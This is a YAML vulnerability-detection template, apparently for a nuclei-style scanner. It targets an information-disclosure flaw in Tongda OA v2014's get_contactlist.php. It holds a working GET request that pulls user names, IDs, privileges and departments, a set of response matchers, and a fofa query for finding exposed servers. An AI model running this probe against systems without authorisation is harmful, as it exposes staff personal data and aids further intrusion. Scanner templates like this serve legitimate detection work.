# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"user_uid":'
          - '"user_name":'
          - '"priv_name":'
          - '"dept_name":'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3'
id: tongda-contact-list-disclosure
info:
  author: zan8in
  description: |
    通达OA v2014 get_contactlist.php文件存在信息泄漏漏洞，攻击者通过漏洞可以获取敏感信息，进一步攻击
    fofa: app="TDXK-通达OA"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞
  severity: high
  tags: tongda,oa,contact,list,disclosure,argus-import
